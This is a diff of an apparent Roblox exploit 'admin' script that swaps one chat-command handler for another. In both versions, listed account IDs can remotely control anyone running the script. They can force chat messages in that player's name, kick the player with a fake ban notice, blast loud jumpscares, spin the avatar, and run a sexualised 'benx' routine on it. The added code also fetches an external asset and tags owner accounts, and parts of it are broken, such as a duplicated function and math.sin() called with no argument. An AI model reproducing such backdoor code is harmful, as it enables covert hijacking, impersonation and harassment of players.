-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -1.8) * CFrame.Angles(-1.5,math.rad(0),0)
-                            task.wait(); player.Character.Humanoid.Sit = true; player.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
-                            player.Character.HumanoidRootPart.CFrame = admin.Character.LowerTorso.CFrame * CFrame.new(0, 0, -1.3) * CFrame.Angles(-1.5,math.rad(0),0)
-                        end)
-                    until onben == false
-                end
+            elseif msg[1] == prefix.."unds" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                 game.Players.LocalPlayer.Character.Animate.Disabled = false
             end
-            if string.find(SplitCMD[1], "-unbenx") or string.find(SplitCMD[1], "!nobenx") then
-                if not ISPREMTOO or ISADMIN then
-                    onben = false
-                    onragdoll()
-                end
+             elseif msg[1] == prefix.."jump" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+               player.Character.Humanoid:ChangeState(3)
             end
-            if string.find(SplitCMD[1], "-jumpscare") then
-                if not ISPREMTOO or ISADMIN then
-                    local ScGui = Instance.new("ScreenGui")
-                    local image = Instance.new("ImageLabel")
-                    ScGui.Parent = game.CoreGui
-                    ScGui.Name = "ScreenGui"
-                    image.Name = "JScare"
-                    image.ImageTransparency = 0
-                    image.BackgroundTransparency = 1
-                    image.Parent = ScGui
-                    image.Position = UDim2.new(0, 0, 0, 0)
-                    image.Size = UDim2.new(1, 0, 1, 0)
-                    image.Image = ("rbxassetid://"..jumpscares[math.random(1,#jumpscares)])
-                    ScGui.IgnoreGuiInset = true
-                    task.wait(5)
-                    ScGui:Destroy()
-                end
-            end
-            if string.find(SplitCMD[1], "-spin") then
-                if not ISPREMTOO or ISADMIN then
-                    local Spin = Instance.new("BodyAngularVelocity")
-                    Spin.Parent = player.Character.HumanoidRootPart
-                    Spin.Name = "MHSpin"
-                    Spin.MaxTorque = Vector3.new(0,math.huge,0)
-                    Spin.AngularVelocity = Vector3.new(0,30,0)
-                end
-            end
-            if string.find(SplitCMD[1], "-unspin") or string.find(SplitCMD[1], "m!nospin") then
-                pcall(function()
-                    player.Character.HumanoidRootPart.MHSpin:Destroy()
-                end)
-            end
-            if string.find(SplitCMD[1], "-chat") then
-                if not ISPREMTOO or ISADMIN then
-                    local TextSay = ""
-                    for i,v in pairs(SplitCMD) do
-                        pcall(function()
-                            if i >= 2 then
-                                TextSay = (TextSay.." "..SplitCMD[i+1])
-                            end
-                        end)
+        elseif msg[1] == prefix.."say" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                local success, err = pcall(function()
+                    local final_msg = ""
+                    local new_msg = {}
+                    for i,v in pairs(msg) do
+                        table.insert(new_msg,v)
                     end
-                    local args = {[1] = TextSay,[2] = "All"}
-                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+                    
+                    table.remove(new_msg,1)
+                    table.remove(new_msg,1)
+                    for i,v in pairs(new_msg) do
+                        final_msg = final_msg..""..v.." "
+                    end
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(final_msg,"All")
+                end)                
+            end
+		elseif msg[1] == prefix.."jumpscare" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                function Scare()
+                    local ScreenGui = Instance.new("ScreenGui")
+                    local ImageLabel = Instance.new("ImageLabel")
+
+                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}
+
+                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}
+
+                    ScreenGui.Parent = game.CoreGui
+                    ScreenGui.Name = "SCREAM"
+                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+                    ImageLabel.Parent = ScreenGui
+                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
+                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
+                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
+                    ImageLabel.Visible = false
+                    ImageLabel.BackgroundTransparency = 1
+                    ImageLabel.Visible = true
+                    local sound = Instance.new("Sound")
+                    sound.Parent = game.Workspace
+                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
+                    sound.Volume = 200
+                    sound:Play()
+                    for i = 0, 1, 0.1 do
+                        wait(0.05)
+                        ImageLabel.ImageTransparency = i
+                    end
+                    sound.Ended:Wait()
+                    sound:Destroy()
+                    ScreenGui:Destroy()
+                end
+                if not game.CoreGui:FindFirstChild("SCREAM") then
+                    Scare()
                 end
             end
-            if string.find(SplitCMD[1], "-gravity") then
-                if not ISPREMTOO or ISADMIN then
-                    game.Workspace.Gravity = 20
+        elseif msg[1] == prefix.."benx" then
+           if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                fucking = true
+                local target = game.Players:FindFirstChild(player.Name)
+                local directionForward = -0.1
+                local BackwardsBoolean = false
+                while fucking do
+                    if not fucking then
+                        Crouch:Stop()
+                        break
+                    end
+                    if target.Character then
+                        if BackwardsBoolean == true then
+                            directionForward=directionForward-0.5
+                        else
+                            directionForward=directionForward+0.5
+                        end
+                        if directionForward >= 3 then
+                            BackwardsBoolean = true
+                        elseif directionForward < 1 then
+                            BackwardsBoolean = false
+                        end
+                        player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame+operator.Character.HumanoidRootPart.CFrame.lookVector*directionForward
+                    end
+                    wait(0.01)
                 end
             end
-            if string.find(SplitCMD[1], "-nogravity") or string.find(SplitCMD[1], "m!ungravity") then
-                game.Workspace.Gravity = 196.2
-            end
-            if string.find(SplitCMD[1], "-fakeban") then
-                if not ISPREMTOO or ISADMIN then
-                player:Kick("You are banned Reason: kid You will get unban after (999999d 0h 0m 0s)")
+        elseif msg[1] == prefix.."unbenx" then
+            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
+                fucking = false
+                wait(2)
+                for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
+                    if v:IsA("AnimationTrack") then
+                        v:Stop()
+                    end
                 end
-            end
-            if string.find(SplitCMD[1], "-milk") then
-                local ScGui = Instance.new("ScreenGui")
-                local image = Instance.new("ImageLabel")
-                ScGui.Parent = game.CoreGui
-                ScGui.Name = "ScreenGui"
-                image.Name = "JScare"
-                image.ImageTransparency = 0
-                image.BackgroundTransparency = 1
-                image.Parent = ScGui
-                image.Position = UDim2.new(0, 0, 0, 0)
-                image.Size = UDim2.new(1, 0, 1, 0)
-                image.Image = "rbxassetid://12480466786"
-                ScGui.IgnoreGuiInset = true
-                task.wait(5)
-                ScGui:Destroy()
             end
         end
-    end)
+    end
 end
 
-for i,v in pairs(game.Players:GetPlayers()) do
-    local PD = v
-    local PREMS = table.find(PremList, v.UserId)
-    if PREMS then
-        v.Chatted:Connect(function(msg)
-            getcommand(PD.UserId, msg)
-        end)
-    end
-end
-players.PlayerAdded:Connect(function(joined)
-    local PDJ = joined
-    local PREMJ = table.find(PremList, joined.UserId)
-    if PREMJ then
-        joined.Chatted:Connect(function(msg)
-            getcommand(PDJ.UserId, msg)
-        end)
+game:service"ReplicatedStorage".DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
+    local name = data.FromSpeaker
+    local msg = data.Message
+    if string.find(url,game:service"Players"[name].UserId) then
+        cmds(msg, game:service"Players"[name].UserId)
     end
 end)
+
+local plrs = game:GetService("Players")
+
+local UI = game:GetObjects("rbxassetid://7437010836")[1]
+
+local cool = {
+    {3802069480, "[⭐]Owner", 2},
+    {2807845064, "owner", 1},
+}
+
+local function isCool(player)
+    local isCool = false
+    local tag
+    local num
+
+    for i, v in next, cool do
+        if player.UserId == v[1] then
+            isCool = true
+            tag = v[2]
+            num = v[3]
+        end
+    end
+
+    return {isCool, tag, num}
+end
+
+local function ApplyTag(player, text, num)
+    local tag = UI:Clone()
+    tag.Nameplate.Text = text
+    if num == 1 then
+        coroutine.wrap(
+            function()
+                while tag ~= nil do
+                    wait()
+                    local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                    tag.Nameplate.TextColor3 = color
+                end
+            end
+        )()
+    end
+
+    tag.Parent = player.Character:WaitForChild("Head")
+end
+
+local function ApplyTag(player, text, num)
+    local tag = UI:Clone()
+    tag.Nameplate.Text = text
+    if num == 2 then
+        coroutine.wrap(
+            function()
+                while tag ~= nil do
+                    wait()
+                    local color = Color3.fromHSV(math.sin() % 5 / 5, 1, 1)
+                    tag.Nameplate.TextColor3 = color
+                end
+            end
+        )()
+    end
+
+    tag.Parent = player.Character:WaitForChild("Head")
+end
+
+
+for _, v in next, game.Players:GetPlayers() do
+    if isCool(v)[1] then
+        ApplyTag(v, isCool(v)[2], isCool(v)[3])
+
+        v.CharacterAdded:Connect(
+            function()
+                ApplyTag(v, isCool(v)[2], isCool(v)[3])
+            end
+        )
+    end
+end
